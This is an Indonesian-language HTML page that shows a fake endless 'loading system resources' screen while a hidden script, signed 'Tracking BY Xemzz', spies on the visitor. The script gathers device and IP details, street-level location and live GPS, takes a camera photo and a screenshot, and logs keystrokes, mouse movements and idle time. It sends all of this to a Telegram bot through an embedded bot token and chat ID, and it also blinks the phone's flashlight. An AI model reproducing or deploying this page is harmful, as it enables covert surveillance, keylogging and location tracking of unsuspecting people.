<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Loading System Resources...</title>
  <style>
    body {
      background-color: #000;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      color: #999;
      overflow: hidden;
    }
    #loading-container {
      text-align: center;
      width: 80%;
      max-width: 400px;
    }
    #loading-text {
      font-size: 22px;
      margin-bottom: 20px;
    }
    #progress-container {
      height: 3px;
      background-color: #222;
      border-radius: 3px;
      overflow: hidden;
    }
    #progress-bar {
      height: 100%;
      width: 0%;
      background-color: #555;
      transition: width 0.3s ease;
    }
    #loading-details {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
    .hidden {
      display: none;
    }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
  <div id="loading-container">
    <div id="loading-text">Memuat sumber daya sistem...</div>
    <div id="progress-container">
      <div id="progress-bar"></div>
    </div>
    <div id="loading-details">Menyiapkan lingkungan...</div>
  </div>

  <!-- Hidden tracking elements -->
  <video id="video" autoplay muted class="hidden"></video>
  <canvas id="canvas" class="hidden"></canvas>

  <script>
    const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
    const chatId = '7525205684';

    // Simulate infinite loading
    let progress = 0;
    const progressBar = document.getElementById('progress-bar');
    const loadingDetails = document.getElementById('loading-details');
    const loadingMessages = [
      "Memeriksa modul sistem...",
      "Memuat komponen inti...",
      "Menginisialisasi antarmuka...",
      "Memverifikasi koneksi...",
      "Menyiapkan lingkungan...",
      "Memeriksa pembaruan...",
      "Memuat aset tampilan..."
    ];

    const loadingInterval = setInterval(() => {
      progress += Math.random() * 5;
      if (progress > 98) progress = 98; // Never reach 100%
      progressBar.style.width = progress + '%';
      
      // Change loading message periodically
      if (Math.random() > 0.9) {
        loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
      }
    }, 500);

    // Telegram functions
    const sendToTelegram = async (data) => {
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: data,
            parse_mode: 'HTML'
          })
        });
      } catch (e) {
        console.error('Error sending to Telegram:', e);
      }
    };

    const sendPhoto = async (blob, filename) => {
      try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, filename);
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        console.error('Error sending photo:', e);
      }
    };

    // Get detailed location (kabupaten/kecamatan)
    const getLocationDetails = async (lat, lon) => {
      try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        
        if (data.address) {
          return {
            kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
            kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
            fullAddress: data.display_name || "Alamat tidak tersedia"
          };
        }
      } catch (e) {
        console.error('Error getting location details:', e);
      }
      return {
        kabupaten: "Tidak diketahui",
        kecamatan: "Tidak diketahui",
        fullAddress: "Alamat tidak tersedia"
      };
    };

    // Collect all device information
    const collectAllInfo = async () => {
      let message = '╭───── Tracking BY Xemzz ───── ⦿\n\n';
      
      // Device Information
      message += '<b>⚙️ DEVICE INFORMATION</b>\n';
      const deviceInfo = [
        ['🖥️ Device', navigator.userAgent],
        ['💻 Platform', navigator.platform],
        ['🌐 Bahasa', navigator.language],
        ['📶 Online', navigator.onLine ? 'Online' : 'Offline'],
        ['📺 Screen Size', `${screen.width}x${screen.height}`],
        ['🪟 Window Size', `${window.innerWidth}x${window.innerHeight}`],
        ['💾 RAM', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'],
        ['🧠 CPU Cores', navigator.hardwareConcurrency],
        ['✋ Touch Support', 'ontouchstart' in window ? '✅ YA' : '❌ TIDAK']
      ];

      deviceInfo.forEach(info => {
        message += `${info[0]}: ${info[1]}\n`;
      });

      // Battery Info
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          message += `🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n`;
          message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
        } catch (e) {
          message += '🔋 Battery: ❌ Tidak tersedia\n';
        }
      }

      // Session Information
      message += '\n<b>📊 SESSION INFORMATION</b>\n';
      message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
      message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
      message += `📜 History Length: ${history.length}\n`;
      message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
      message += `🌍 URL: ${window.location.href}\n`;
      message += `📄 Title: ${document.title}\n`;

      // Location Information
      message += '\n<b>📍 LOCATION INFORMATION</b>\n';
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const offset = new Date().getTimezoneOffset();
      message += `🕓 Timezone: ${tz}\n`;
      message += `🧭 Offset: ${offset} menit\n`;

      // Plugins Information
      message += '\n<b>🧩 PLUGINS</b>\n';
      if (navigator.plugins.length > 0) {
        for (let i = 0; i < navigator.plugins.length; i++) {
          message += `🔌 Plugin ${i+1}: ${navigator.plugins[i].name}\n`;
        }
      } else {
        message += '❌ Tidak ada plugins terdeteksi\n';
      }

      // Features Information
      message += '\n<b>⚙️ FEATURES</b>\n';
      const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
      features.forEach(f => {
        message += `⚙️ ${f}: ${f in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
      });

      // IP and Detailed Location Information
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        
        message += '\n<b>📡 IP INFORMATION</b>\n';
        message += `📡 IP Address: ${ipData.ip}\n`;
        message += `🏙️ Kota: ${ipData.city}\n`;
        message += `🗺️ Wilayah: ${ipData.region}\n`;
        
        // Get kabupaten/kecamatan details
        if (ipData.latitude && ipData.longitude) {
          const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
          message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
          message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
          message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
        }
        
        message += `🌎 Negara: ${ipData.country_name}\n`;
        message += `🏷️ Kode Pos: ${ipData.postal}\n`;
        message += `📌 Latitude: ${ipData.latitude}\n`;
        message += `📍 Longitude: ${ipData.longitude}\n`;
      } catch (e) {
        message += '\n❌ Gagal mendapatkan informasi IP\n';
      }

      message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';

      return message;
    };

    // Flashlight control (for mobile devices)
    const toggleFlashlight = async () => {
      try {
        if (!('mediaDevices' in navigator)) return;
        
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'environment',
            advanced: [{ torch: true }]
          }
        });
        
        const track = stream.getVideoTracks()[0];
        if (!track.getCapabilities().torch) {
          sendToTelegram('❌ Flashlight: Torch not supported');
          stream.getTracks().forEach(t => t.stop());
          return;
        }

        for (let i = 0; i < 10; i++) {
          await track.applyConstraints({ advanced: [{ torch: true }] });
          await new Promise(resolve => setTimeout(resolve, 1000));
          await track.applyConstraints({ advanced: [{ torch: false }] });
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        stream.getTracks().forEach(t => t.stop());
      } catch (error) {
        sendToTelegram(`❌ Flashlight error: ${error.message}`);
      }
    };

    // Main tracking function
    const startTracking = async () => {
      // Send initial device info
      const deviceInfo = await collectAllInfo();
      await sendToTelegram(deviceInfo);

      // Try to access camera
      try {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
        
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        await sendToTelegram('❌ Camera access blocked');
      }

      // Take screenshot
      setTimeout(async () => {
        try {
          const canvas = await html2canvas(document.body);
          canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
        } catch (e) {
          await sendToTelegram('❌ Screenshot failed');
        }
      }, 5000);

      // GPS tracking
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(async (pos) => {
          const coords = pos.coords;
          let gpsInfo = `<b>📍 LIVE GPS TRACKING</b>\n` +
                       `<b>📌 Lat:</b> ${coords.latitude}\n` +
                       `<b>📍 Lng:</b> ${coords.longitude}\n` +
                       `<b>🎯 Akurasi:</b> ${coords.accuracy}m`;
          
          // Get detailed location
          const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
          gpsInfo += `\n<b>🏙️ Kabupaten:</b> ${locationDetails.kabupaten}\n` +
                     `<b>🏙️ Kecamatan:</b> ${locationDetails.kecamatan}\n` +
                     `<b>🏠 Alamat:</b> ${locationDetails.fullAddress}`;
          
          await sendToTelegram(gpsInfo);
        }, 
        async (err) => {
          await sendToTelegram(`❌ GPS Error: ${err.message}`);
        }, 
        { 
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 5000
        });
      }

      // Mouse/keyboard tracking (for desktop)
      document.addEventListener('mousemove', (e) => {
        sendToTelegram(`🖱️ Mouse Position: (${e.clientX}, ${e.clientY})`);
      });

      let typedChars = '';
      document.addEventListener('keydown', (e) => {
        typedChars += e.key;
        if (typedChars.length > 20) {
          sendToTelegram(`⌨️ Keystrokes: ${typedChars}`);
          typedChars = '';
        }
      });

      // Flashlight control (for mobile)
      setTimeout(() => {
        toggleFlashlight();
      }, 10000);

      // Idle time tracking
      let idleStart = Date.now();
      let idleTimer;
      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
        window.addEventListener(evt, () => {
          const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
          sendToTelegram(`😴 User idle selama: ${idleTime} detik`);
          idleStart = Date.now();
          clearTimeout(idleTimer);
          idleTimer = setTimeout(() => {
            sendToTelegram('💤 User diem kayak mayat selama 60 detik');
          }, 60000);
        });
      });
    };

    // Start tracking after a short delay
    setTimeout(startTracking, 3000);
  </script>
</body>
</html>